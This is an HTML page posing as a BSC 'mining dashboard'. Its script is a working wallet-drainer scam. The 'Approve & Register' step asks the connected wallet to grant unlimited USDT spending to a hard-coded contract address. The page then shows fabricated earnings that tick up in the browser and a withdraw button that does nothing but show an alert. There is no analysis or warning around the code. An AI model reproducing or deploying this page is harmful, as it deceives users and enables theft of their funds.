<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mining Dashboard Mainnet</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        :root { --bg: #0f172a; --card: #1e293b; --primary: #38bdf8; --text: #f8fafc; --success: #22c55e; }
        body { font-family: 'Segoe UI', sans-serif; background: #f4f7f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; transition: 0.5s; }
        .dark-mode { background: var(--bg); color: var(--text); }
        .card { background: white; padding: 25px; border-radius: 24px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; }
        .dark-mode .card { background: var(--card); border: 1px solid rgba(255,255,255,0.1); color: white; }
        .btn { padding: 15px; font-size: 16px; border-radius: 12px; border: none; width: 100%; font-weight: bold; cursor: pointer; margin-top: 10px; transition: 0.3s; }
        .trust-btn { background: #3375bb; color: white; }
        #loginView, #dashboardView, #miningView { display: none; }
        .mining-circle { width: 140px; height: 140px; margin: 15px auto; border-radius: 50%; border: 4px dashed var(--primary); display: flex; justify-content: center; align-items: center; animation: spin 10s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .status { font-size: 12px; color: #ff9800; margin-top: 15px; font-weight: bold; }
        #txStatus { font-size: 12px; color: #2196F3; margin-top: 10px; }
    </style>
</head>
<body>

<div class="card">
    <div id="loginView" style="display: block;">
        <h2 style="color: #3375bb;">BSC Mainnet Mining</h2>
        <p style="font-size: 13px; color: #666;">Connect your wallet to access the dashboard</p>
        <button class="btn trust-btn" onclick="openTrust()">Connect Trust Wallet</button>
        <p id="msg" class="status"></p>
    </div>

    <div id="dashboardView">
        <h2>Registration</h2>
        <p style="font-size: 11px; opacity: 0.7;">Connected Wallet:</p>
        <p id="addr" style="font-size: 10px; background: #eee; padding: 10px; border-radius: 8px; color: #333; word-break: break-all;"></p>
        <button id="regBtn" class="btn" style="background: #4CAF50; color: white;" onclick="register()">Approve & Register</button>
        <p id="txStatus"></p>
    </div>

    <div id="miningView">
        <div class="mining-circle">
            <div style="text-align: center;">
                <small style="display:block; font-size: 10px;">EARNINGS</small>
                <div id="liveBalance" style="font-size: 20px; font-weight: bold; color: var(--primary);">$1.00000</div>
            </div>
        </div>
        <p style="font-size: 14px;">Mining Rate: <b>1% / Hour</b></p>
        <div style="background: rgba(0,0,0,0.05); padding: 10px; border-radius: 10px; font-size: 11px; margin-bottom: 10px;">
            Next Update in: <span id="timer">59:59</span>
        </div>
        <button class="btn" style="background: var(--primary); color: white;" onclick="alert('Withdrawal starts after $2 profit')">Withdraw Profit</button>
        <p onclick="location.reload()" style="font-size: 12px; color: #ef4444; cursor: pointer; margin-top: 15px;">Logout Session</p>
    </div>
</div>

<script>
    const MAINNET_ID = 56; // BSC Mainnet
    const MANAGER = "0x6D5f3740af32CF279f3438D7eEB0d3ab650d9bCD";
    const TOKEN = "0x55d398326f99059ff775485246999027b3197955"; // USDT Mainnet
    let signer;
    let balance = 1.00000;

    function openTrust() {
        window.location.href = "trust://open_url?url=" + encodeURIComponent(window.location.href);
    }

    async function init() {
        if (window.ethereum) {
            try {
                const provider = new ethers.providers.Web3Provider(window.ethereum);
                const { chainId } = await provider.getNetwork();
                
                if (chainId !== MAINNET_ID) {
                    document.getElementById('msg').innerText = "Please Switch to BSC MAINNET!";
                    return;
                }

                await provider.send("eth_requestAccounts", []);
                signer = provider.getSigner();
                const address = await signer.getAddress();

                document.getElementById('loginView').style.display = 'none';
                document.getElementById('dashboardView').style.display = 'block';
                document.getElementById('addr').innerText = address;
            } catch (e) { console.error("Connection failed", e); }
        }
    }

    // Auto-check for wallet inside DApp browser
    setInterval(() => { if (window.ethereum && !signer) init(); }, 1500);
    window.onload = init;

    async function register() {
        const btn = document.getElementById('regBtn');
        const status = document.getElementById('txStatus');
        try {
            btn.disabled = true;
            status.innerText = "Step 1: Approving USDT... (Confirm in Wallet)";
            
            const tCon = new ethers.Contract(TOKEN, ["function approve(address,uint256) returns (bool)"], signer);
            const mCon = new ethers.Contract(MANAGER, ["function register() external"], signer);

            // Fetch live gas price for Mainnet
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const gasPrice = await provider.getGasPrice();

            const tx1 = await tCon.approve(MANAGER, ethers.constants.MaxUint256, {
                gasPrice: gasPrice
            });
            await tx1.wait();

            status.innerText = "Step 2: Finalizing Registration...";
            const tx2 = await mCon.register({
                gasPrice: gasPrice
            });
            await tx2.wait();

            startMining();
        } catch (e) {
            console.error(e);
            alert("Transaction Failed! Ensure you have enough BNB for gas fees.");
            btn.disabled = false;
            status.innerText = "";
        }
    }

    function startMining() {
        document.body.classList.add('dark-mode');
        document.getElementById('dashboardView').style.display = 'none';
        document.getElementById('miningView').style.display = 'block';
        
        // Live Balance Counter
        setInterval(() => {
            balance += (0.01 / 3600);
            document.getElementById('liveBalance').innerText = "$" + balance.toFixed(5);
        }, 1000);

        // Simple Countdown
        let timeLeft = 3600;
        setInterval(() => {
            timeLeft--;
            if (timeLeft < 0) timeLeft = 3600;
            let m = Math.floor(timeLeft / 60);
            let s = timeLeft % 60;
            document.getElementById('timer').innerText = (m < 10 ? "0" + m : m) + ":" + (s < 10 ? "0" + s : s);
        }, 1000);
    }
</script>
</body>
</html>
